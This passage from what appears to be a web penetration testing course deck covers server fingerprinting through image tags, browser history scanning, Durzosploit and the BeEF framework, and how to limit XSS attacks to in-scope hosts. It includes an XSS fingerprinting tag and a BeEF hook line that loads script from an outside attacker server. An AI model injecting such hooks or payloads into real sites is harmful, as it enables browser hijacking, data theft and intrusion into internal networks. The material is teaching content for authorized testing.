Fingerprinting Servers

<!--[Rectangle 3]-->
- Port scanning found www servers
- What are they running?
- We can use JavaScript to fingerprint them
- Most server have default graphics/files
	- apache_pb.gif
	- hp_invent_logo.gif

Note:
<!--[Rectangle 7]-->
68

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Since we found web servers, let's find out what types of server they are running.  This is made easier since most servers ship with default graphic files.

Some examples of this are apache_pb.gif from the Apache HTTP server and the hp_invent_logo.gif which is on most HP devices' embedded web server.

---

<!-- Slide 69 -->
<!--[Rectangle 2]-->
Fingerprinting Code

<!--[Rectangle 3]-->
- Try to retrieve the file using an IMG tag
- onerror event means the image did not exist
- onload event means the graphic exists
**<img src=http://foundip/graphic.name onerror="fprintfunction('error')" onload="fprintfunction('load')">**

Note:
<!--[Rectangle 7]-->
69

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The web server fingerprinting code creates an image tag.  This image tag references the default graphic being tested and has an onerror event.  If a valid image is found, the onerror event does not fire, signifying that we now know what the server is running.

---

<!-- Slide 70 -->
<!--[Rectangle 2]-->
Sources of Defaults

<!--[Rectangle 3]-->
- Many different sources are available
- Nikto is one excellent source
	- Contains a database of default files
- Yokoso! is another source of defaults
	- http://yokoso.secureideas.com
	- The project is focused on fingerprinting infrastructure through XSS

Note:
<!--[Rectangle 7]-->
70

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Nikto is an excellent source of information regarding default image files.  It contains a database that includes this information.  And since it has already been used in our process, you already have access to it.

Yokoso! is another project that contains URI fingerprints for our use.  It is available at yokoso.secureideas.com and contains many different fingerprints.  It is actively looking to expand the list, so I think it is worth checking out.  (Of course I am the project lead, so I may be biased.)

---

<!-- Slide 71 -->
<!--[Rectangle 2]-->
Browse History

<!--[Rectangle 3]-->
- Also uses an IFRAME
- Long list of links are placed in the IFRAME
- JavaScript checks if the link is displayed with the **link **or **vlink **colors

<!--[Picture 1]-->

Note:
<!--[Rectangle 7]-->
71

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This code allows you to list a series of URLs and determine if the browser has visited them.  One example of this code is available at:
http://www.gnucitizen.org/projects/javascript-visited-link-scanner/. 

It is also part of the AttackAPI, which we will be discussing later.

This screenshot is from the AttackAPI version of a history scanner.  The top box is the list of urls that will be checked and the bottom contains the results.  We will discuss the AttackAPI further on in the day.

---

<!-- Slide 72 -->
<!--[Rectangle 2]-->
Uses for History Scanning

<!--[Rectangle 3]-->
- There are multiple uses for history scanning
	- Targets for cache poisoning
	- Find administrative users
	- Map intranet sites
	- Discover network devices

Note:
<!--[Rectangle 7]-->
72

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The ability to determine if someone has visited a site gives us some valuable information.  

The first is what sites should we target for DNS cache poisoning or targeted phishing attacks.

The next allows us to check to see if the user has visited any administrative pages we have discovered.  This would signify that this user has elevated privileges and would be an excellent target for further exploitation.

Mapping intranet sites is done by listing potential URLs for internal sites and seeing if the browser has been there.  Site names and URLs can be found by either guessing based on other sites, or information found during the reconnaissance phase.

The attacker is also able to discover network devices by listing the default pages for controlling these devices to see if they have been visited.

---

<!-- Slide 73 -->
<!--[Title 1]-->
# Durzosploit


<!--[Content Placeholder 2]-->
- Durzosploit is similar to Metasploit
	- But its focused on creating XSS payloads
	- It has a number of prepackaged exploits
		- Simple to build new ones
	- Powerful obfuscators to help hide attack payloads
		- Again, simple to add new ones to the engine

<!--[Picture 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Durzosploit is a new engine designed to help build attack payloads.  It is similar to Metasploit in that it contains pre-built exploits and obfuscators to help hide the attacks.  We interact with it through a console interface, selecting each of the exploits and placing them into a session.  It will then output the attack payload to the file system.  Once it is built, we are able to obfuscate the payload to help bypass filtering and intrusion detection systems.

Durzosploit has been taken over by the Secure Ideas team and is part of SamuraiWTF.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 74 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- *** ***<span style="text-decoration: underline;">***Durzosploit Exercise***</span>
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this exercise, we will explore Durzosploit.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 75 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	- *** ***<span style="text-decoration: underline;">***XSS Frameworks***</span>
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next section we will cover some of the exploitation frameworks available.  These frameworks are used to perform more advanced attacks using XSS than most people know exist.  They also allow us to perform our testing easier and faster, while validating the vulnerability.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 76 -->
<!--[Rectangle 2]-->
Exploit Frameworks

<!--[Rectangle 3]-->
- Client side scripts are very powerful
- Let's make it easier to leverage this power
- Frameworks will do the heavy lifting for us

Note:
<!--[Rectangle 7]-->
76

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Since client side scripts make use of a full programming language, they can be very powerful.  But with this power comes difficult code to write and maintain.  So let's use our computers to make it easier for us.  The exploit frameworks we are going to discuss will do a lot of the heavy lifting for us.

---

<!-- Slide 77 -->
<!--[Rectangle 2]-->
Frameworks Covered

<!--[Rectangle 3]-->
- There are many frameworks available
- More frameworks are released all the time
- We will explore one of the best frameworks next
	- BeEF

Note:
<!--[Rectangle 7]-->
77

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
We will be covering two frameworks in this section of the class. BeEF is a PHP based application that act as a controller and include the JavaScript to control the victim browser.

---

<!-- Slide 78 -->
<!--[Rectangle 2]-->
Zombies

<!--[Rectangle 3]-->
- Similar to Bots
- Control of the browser is provided to the attacker
- Based on the framework used, we can perform many attacks through zombie browsers

<!--[Picture 4]-->

Note:
<!--[Rectangle 7]-->
78

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Let's take a moment and discuss zombies.  Zombies are browsers that have been taken over by the attacker.  The attacker is then able to control what the user does within that browser.  These are similar to bots being spread by worms, but instead of taking over the machine, they control the browser.

---

<!-- Slide 79 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		- <span style="text-decoration: underline;">*** BeEF***</span>
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next section will cover BeEF, which is a very interesting framework.  It is the first inter-protocol exploitation framework to be released.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 80 -->
<!--[Rectangle 2]-->
BeEF

<!--[Rectangle 3]-->
- Browser Exploitation Framework
	- by Wade Alcorn
- Available at:
	- http://beefproject.com/
- Very powerful framework  due to the inter-protocol features
- Focuses on payload delivery

<!--[Rectangle 3]-->
- Current stable version is Ruby
	- Older PHP still common

<!--[Picture 1]-->

<!--[Rectangle 5]-->

Note:
<!--[Rectangle 7]-->
80

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
BeEF is a framework for building attacks.  These attacks are then launched from the browser.  BeEF allows the attacker/developer to focus on payloads instead of how to get the attack to the client.

This screenshot is of the BeEF control interface.  On the left side you can see the menu options and the list of zombies under this attacker's control.  On the right is the panes that will show the command you wish to run and the results from this command.  

---

<!-- Slide 81 -->
<!--[Title 1]-->
# BeEF Interface


<!--[Content Placeholder 2]-->
- The various panels control the victim browsers
- Zombies are listed as offline or online
	- If offline, commands will be sent when the browser reconnects
- Module descriptions are to the right
	- Also where the module config appears
- More menu options can be accessed by right clicking
- The color of the icon determines if the module runs on the victim

<!--[Picture 3]-->

<!--[Content Placeholder 2]-->
- Works on the victim
- Works but may be visible
- Not Confirmed to work
- Doesn't work

<!--[Picture 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The BeEF interface is controlled via web interface.  This interface provides a series of panels to interact with the pieces we need for our exploitation.

The first panel is a list of the zombie browser, both the ones offline and online.  For the offline ones, BeEF will cache the commands and issue them when the browser reconnects!

The next panel is a list of modules available.  Each module is color coded based on the zombie selected.  This color coding signifies the reliability and functionality of the module against that target.  When we select a module, the panels to the right will list the description and the configuration options.  We can then press the execute button to send the command to the browser victim.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 82 -->
<!--[Rectangle 2]-->
Zombie Control

<!--[Rectangle 3]-->
- Uses hook.js to hook the browser
	<script src=http://beefserver:3000/hook.js></script>
- Inject this script via an XSS attack
	- It is the payload of the exploit
- This file connects the victim to  the BeEF controller
	- The BeEF controller changes the JS based on commands issued
- We then use the various modules to control the zombie
	- Or redirect the victim to a Metasploit server

Note:
<!--[Rectangle 7]-->
82

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
When we want to use BeEF to control a zombie browser, we inject the hook.js file via an XSS flaw.  When the victim loads the page with the exploit, their browser is connected back to the BeEF controller.  The pentester can then issue commands back to the victim browser.  This is done through the hook.js file, which is changed based on the commands we want to send.

---

<!-- Slide 83 -->
<!--[Rectangle 2]-->
BeEF Functionality

<!--[Rectangle 3]-->
- BeEF contains a number of modules to modules
	- These modules provide the various attacks against the zombie machines 
- Multiple modules available:
	- Clipboard Stealing
	- History Browsing
	- Port Scanning
	- Browser Exploits
	- Inter-Protocol Exploitation

<!--[Picture 4]-->

Note:
<!--[Rectangle 7]-->
83

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
BeEF contains the following capabilities:
- Controlling Zombies
- Modules
		- Autorun
		- Clipboard Stealing
		- JavaScript Injection
		- Request Initiation
		- History Browsing
- Port Scanning
- Browser Exploits
- Inter-Protocol Exploitation

---

<!-- Slide 84 -->
<!--[Rectangle 2]-->
Clipboard Theft

<!--[Rectangle 3]-->
- Module used to grab the victims clipboard contents
- Sends it to the BeEF server
- Abuses a feature in Internet Explorer
- Only works on victims running IE before version 7
	- Without prompting the user

Note:
<!--[Rectangle 7]-->
84

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This module will retrieve the contents of the clipboard for the attacker.  Once the data is retrieved, its sent back to the controller server.  This module is abusing a feature of IE 6 and earlier where JavaScript can access this without prompting the user.  IE 7+ still allows this, but the user is prompted.

---

<!-- Slide 85 -->
<!--[Rectangle 2]-->
 History Browsing

<!--[Rectangle 3]-->
- As with AttackAPI, this module retrieves browser history
- Uses brute force techniques
- We must provide a list to BeEF
	- It has a few sites by default
- Allows us to target users and sites

Note:
<!--[Rectangle 7]-->
85

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This module will send a list of urls to the zombie and then return if that client has accessed them.  As we have discussed earlier today, this allows us to fingerprint the victims, map their infrastructure and determine potential sites to use in other attacks.

---

<!-- Slide 86 -->
<!--[Rectangle 2]-->
Request Initiation

<!--[Rectangle 3]-->
- Module to send HTTP requests
- Victim browser makes the request as directed
- Excellent for CSRF attacks
- This module does not return page content to the attacker

Note:
<!--[Rectangle 7]-->
86

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This module will direct the zombie to request a page.  This could be used to download software to the machine.  It could also be used to send the client to a specific site, either to click on ads for revenue or to perform a DoS attack by overwhelming the web server with requests.

---

<!-- Slide 87 -->
<!--[Rectangle 2]-->
Port Scanning

<!--[Rectangle 3]-->
- Port scan a network through the zombies
- Quickly map a network
- Distributed across zombies to lower risk of detection
- Very stealthy with enough zombies

Note:
<!--[Rectangle 7]-->
87

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
BeEF includes an interesting port scanner, which can conduct network port scans using distributed zombies.  This means that with enough zombies, the attacker could have each one request a single port.  What IDS is tuned to catch that?!?

---

<!-- Slide 88 -->
<!--[Title 1]-->
# Browser Exploitation


<!--[Content Placeholder 2]-->
- BeEF now supports integrating with Metasploit
	- This requires a running copy of Metasploit 
	- Reachable by the BeEF server
- BeEF will inject an iframe into the victim to deliver a browser exploit
	- Also supports AutoPWN which is not recommended

<!--[Picture 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In current versions of BeEF, the ability to connect with Metasploit has been added.  The BeEF controller connects to Metasploit via an RPC connection and loads the available exploits and payloads.  We are able to select the attack to deliver and BeEF will inject an iframe pointing to the Metasploit attack.  BeEF does allow us to use the Metasploit Browser AutoPWN, which delivers every exploit until access is gained.  This is not recommended as it isn't really stable and can cause issues during a test.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 89 -->
<!--[Title 3]-->
# Inter-protocol Exploitation


<!--[Rectangle 3]-->
- Many protocols are forgiving
	- They will ignore "junk"
	- HTTP Request headers are often considered junk!
- BeEF allows for exploitation across protocols
	- From a hooked browser running attacker's scripts, we can direct HTTP requests to target servers
	- Payload of HTTP request is a service-side exploit, to be delivered from hooked browser to target server (possibly on intranet)
- BeEF injects a BindShell as an exploit payload
- Pen tester interacts with the shell
	- Through BeEF controller application
	- Controller runs on pen tester's server

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Attackers can use BeEF to communicate and exploit other protocols.  For example, BeEF contains the module to communicate and exploit an Asterisk VoIP server.  It can communicate with a wide variety of services and it is simple to port Metasploit exploits to BeEF.

Many protocols are forgiving in regards to understanding the requests coming from clients.  Because of this forgiveness, BeEF can abuse it.  BeEF sends HTTP requests that contain the various protocols in the payload.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 90 -->
<!--[Rectangle 2]-->
BeEF Protocol  
Exploitation (1)

<!--[Line 3]-->

<!--[Line 4]-->

<!--[Line 5]-->

<!--[Line 6]-->

<!--[Text Box 7]-->
**Firewall  
Infrastructure**

<!--[Object 2]-->

<!--[Text Box 9]-->
**DNS**

<!--[Object 3]-->

<!--[Text Box 11]-->
**Web  
Server**

<!--[Object 4]-->

<!--[AutoShape 13]-->
****
****
****
****
****
****
****
****
****
****

<!--[AutoShape 14]-->

<!--[Group 18]-->

<!--[Text Box 45]-->
**Client**

<!--[Object 5]-->

<!--[Text Box 48]-->
**Internal Server**

<!--[Text Box 49]-->
**1. BeEF XSS stub injected into web app**

<!--[Freeform 50]-->

<!--[Line 53]-->

<!--[Text Box 54]-->
**Mail**

<!--[Object 6]-->

<!--[Text Box 51]-->
**2. User accesses web server. BeEF XSS hooks browser**

<!--[Group 65]-->

<!--[Text Box 92]-->
**BeEF Controller**

<!--[Freeform 95]-->

<!--[Text Box 94]-->
**3. Browser reports to BeEF controller**

<!--[Freeform 96]-->

<!--[Rectangle 97]-->
**Target  
Network**

<!--[Rectangle 98]-->
**Internet**

<!--[Text Box 99]-->
**4. Attacker accesses BeEF controller**

<!--[Freeform 100]-->

<!--[Object 7]-->

<!--[Text Box 99]-->
**This example uses the PHP version of BeEF**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Here is the steps we follow to perform the inter-protocol exploitation.

1. BeEF's XSS stub is injected into the XSS flaw
2. Client accesses the vulnerable web application and BeEF hooks the browser
3. Browser reports to the BeEF controller and awaits commands
4. The attacker accesses the BeEF controller t view the available zombies

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 91 -->
<!--[Rectangle 2]-->
BeEF Exploit Module Interface

<!--[Picture 4]-->

<!--[Rectangle 5]-->

<!--[AutoShape 6]-->
       

<!--[AutoShape 7]-->
       

<!--[Text Box 8]-->
**Additional exploit modules can be added from Metasploit.**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Here is a screenshot of the BeEF interface where the exploit is selected and configured.  This is the exploit that is delivered through the inter-protocol communication.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 92 -->
<!--[Rectangle 2]-->
BeEF Inter-Protocol   
Exploitation (2)

<!--[Content Placeholder 85]-->

<!--[Line 3]-->

<!--[Line 4]-->

<!--[Line 5]-->

<!--[Line 6]-->

<!--[Text Box 7]-->
**Firewall  
Infrastructure**

<!--[Object 2]-->

<!--[Text Box 9]-->
**DNS**

<!--[Object 3]-->

<!--[Text Box 11]-->
**Web   
Server**

<!--[Object 4]-->

<!--[AutoShape 13]-->
****
****
****
****
****
****
****
****
****
****

<!--[AutoShape 14]-->
****

<!--[Object 5]-->

<!--[Group 16]-->

<!--[Text Box 43]-->
**Client**

<!--[Object 6]-->

<!--[Text Box 45]-->
**Internal Server**

<!--[Text Box 46]-->
**7. Send shell commands to execute on internal server**

<!--[Line 48]-->

<!--[Text Box 49]-->
**Mail**

<!--[Object 7]-->

<!--[Text Box 51]-->
**6. ****Exploit internal server**

<!--[Group 52]-->

<!--[Text Box 79]-->
**BeEF Controller**

<!--[Text Box 81]-->
**5. Attacker uses BeEF controller to tell victim browser to exploit internal server**

<!--[Freeform 83]-->

<!--[Line 84]-->

<!--[Freeform 85]-->

<!--[Picture 86]-->

<!--[AutoShape 87]-->
5          

<!--[AutoShape 89]-->
7          

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this diagram we continue the process for exploitation.

5. The attacker tells the victim browser to deliver the exploit to the internal server
6. The victim exploits the internal server, delivering the shell
7. The attacker then instructs the shell through the client browser

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 93 -->
<!--[Title 10]-->
# BeEF Interface


<!--[Content Placeholder 11]-->

<!--[Rectangle 6]-->

<!--[Group 8]-->

<!--[Rectangle 5]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This screenshot shows the interface to send the commands through the victim browser.  The results are then visible within the Zombies menu.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 94 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- *** ***<span style="text-decoration: underline;">***BeEF Exercise***</span>
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next exercise we will explore the BeEF interface.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 95 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	- *** ***<span style="text-decoration: underline;">***Limiting XSS targets***</span>
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next section will explore various ways to limit the XSS attacks we perform.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 96 -->
<!--[Rectangle 2]-->
Limiting Targets of  
XSS Attacks

<!--[Rectangle 3]-->
- As pen testers, we don't want our injected scripts to run on just any browser that accesses our content
	- We want to ensure that the XSS runs on a machine within the target network IP address range
- How can we add intelligence to our script delivery method to control which browsers the injected scripts will run in?
- Five possibilities:
	1) Client-side code with Java Applet identifying IP addr
	2) Client-side code with pen tester's server identifying IP addr
	3) Server-side code on target server
	4) Server-side code on pen tester's server
	5) Pen tester's infrastructure configuration

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Since we are not actually malicious attackers, we need to have methods to limit which client machines are in-scope for the test.  We have to add intelligence to either the attack script or the delivery mechanism to handle this. 

Keep in mind that these methods to limit scope are not fail-proof, but they provide the best chance at preventing misdirected attacks.  There are five possibilities:

	1. Client-side code with Java Applet identifying IP addr
	2. Client-side code with pen tester's server identifying IP addr
	3. Server-side code on target server
	4. Server-side code on pen tester's server
	5. Pen tester's infrastructure configuration
	
We also can combine these methods to expand our ability to determine scope.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 97 -->
<!--[Rectangle 2]-->
1) Client-Side Code with Java Applet

<!--[Rectangle 3]-->
- XSS code is injected into web application
- Runs on target browser
	- JavaScript loads Java Applet from Pen Tester's web server
		- MyAddress.class by Lars Kinderman is one example
	- This applet determines IP address of machine on which it executes

<!--[Object 2]-->

<!--[Object 3]-->

<!--[Group 6]-->

<!--[Group 33]-->

<!--[Text Box 60]-->
**Target  
Browser**

<!--[Text Box 61]-->
**Pen  
Tester**

<!--[Text Box 62]-->
**Target**
**Web Server**

<!--[Text Box 63]-->
**Pen Tester****'s**
**Web Server**

<!--[Freeform 64]-->

<!--[Text Box 65]-->
**1. Inject XSS code**

<!--[Freeform 66]-->

<!--[Text Box 67]-->
**2. Fetch XSS code**

<!--[Text Box 68]-->
**3. Run XSS. fetch MyAddress.class**

<!--[Freeform 69]-->

<!--[Text Box 70]-->
**4. Look at MyAddress.class results.  Run attack . if browser in scope**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The first method uses a java applet to determine the internal address of the client.  This applet then passes the address to the JavaScript which would contain the logic to determine scope.  This is an excellent method when we have certain targets within a network.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 98 -->
<!--[Rectangle 2]-->
2) Client-side Code with Pen Tester's Server Identifying IP Address

<!--[Rectangle 3]-->
- XSS code is injected into web application
- Runs on target browser
	- JavaScript calls pen tester's server code to determine access

<!--[Object 2]-->

<!--[Object 3]-->

<!--[Group 6]-->

<!--[Group 33]-->

<!--[Text Box 60]-->
**Target  
Browser**

<!--[Text Box 61]-->
**Pen  
Tester**

<!--[Text Box 62]-->
**Target**
**Web Server**

<!--[Text Box 63]-->
**Pen Tester****'s**
**Web Server**

<!--[Freeform 64]-->

<!--[Text Box 65]-->
**1. Inject XSS code**

<!--[Freeform 66]-->

<!--[Text Box 67]-->
**2. Fetch XSS code**

<!--[Text Box 68]-->
**3. Run XSS. access some PHP page on pen tester****'s server**

<!--[Freeform 69]-->

<!--[Text Box 70]-->
**5. Look at response from server code.  Run Attack . if browser in scope.**

<!--[Text Box 71]-->
**4. Server formulates response with IP addr of client that it sees**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This second method uses logic on a server controlled by the pen-tester.  This server then responds to a request from the attack script with the IP address it sees from the client.

This method is useful for limiting scope to a specific company.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 99 -->
<!--[Rectangle 2]-->
3) Server-Side Code on Target Server

<!--[Rectangle 3]-->
- Code is loaded onto victim server
	- PHP, ASP, CFM, etc.
- Injected content loads page
	- Via IFRAME
	- Server-side code determines client address

<!--[Object 2]-->

<!--[Object 3]-->

<!--[Group 6]-->

<!--[Group 33]-->

<!--[Text Box 60]-->
**Target  
Browser**

<!--[Text Box 61]-->
**Pen  
Tester**

<!--[Text Box 62]-->
**Target**
**Web Server**

<!--[Text Box 63]-->
**Pen Tester****'s**
**Web Server**

<!--[Freeform 64]-->

<!--[Text Box 65]-->
**1. Inject PHP code . also inject web content to call PHP page via IFRAME**

<!--[Freeform 66]-->

<!--[Text Box 68]-->
**4. Run XSS . if target server delivered it**

<!--[Text Box 70]-->
**3. PHP determines if browser IP address is in scope and, if so, delivers XSS attack**

<!--[Text Box 71]-->
**2. Access injected content . getting redirected to PHP page**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The third option is to use the same server type code as option two, but inject it onto an internal server first.  This allows the code to determine the internal IP address, similarly to option one.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 100 -->
<!--[Rectangle 2]-->
4) Server-Side Code on Pen Tester's Server

<!--[Rectangle 3]-->
- Injected content loads attacks
	- <SCRIPT SRC>
	- References pen tester's server code
- Server code generates attack scripts . if victim is in scope

<!--[Object 2]-->

<!--[Object 3]-->

<!--[Group 72]-->

<!--[Group 99]-->

<!--[Text Box 126]-->
**Target  
Browser**

<!--[Text Box 127]-->
**Pen  
Tester**

<!--[Text Box 128]-->
**Target**
**Web Server**

<!--[Text Box 129]-->
**Pen Tester****'s**
**Web Server**

<!--[Freeform 130]-->

<!--[Text Box 131]-->
**1. Inject content that refers to a script on pen tester****'s web server**

<!--[Freeform 132]-->

<!--[Text Box 133]-->
**2. Fetch page that refers to script on pen tester****'s site**

<!--[Text Box 134]-->
**4. Run XSS . if server provides it**

<!--[Freeform 135]-->

<!--[Text Box 136]-->
**3. Server code determines if browser IP addr is in scope . if so, delivers XSS attack script**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The fourth option is to load the script from server code.  This means that the server code, PHP, ASP or whatever, actually generates the client side code to deliver.  The server code determines if the victim is within scope.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 101 -->
<!--[Rectangle 2]-->
5) Pen Tester Infrastructure Configuration

<!--[Rectangle 3]-->
- Injected content loads attack with <SCRIPT SRC>
- Infrastructure allows or blocks access
	- Web server configuration with HTACCESS
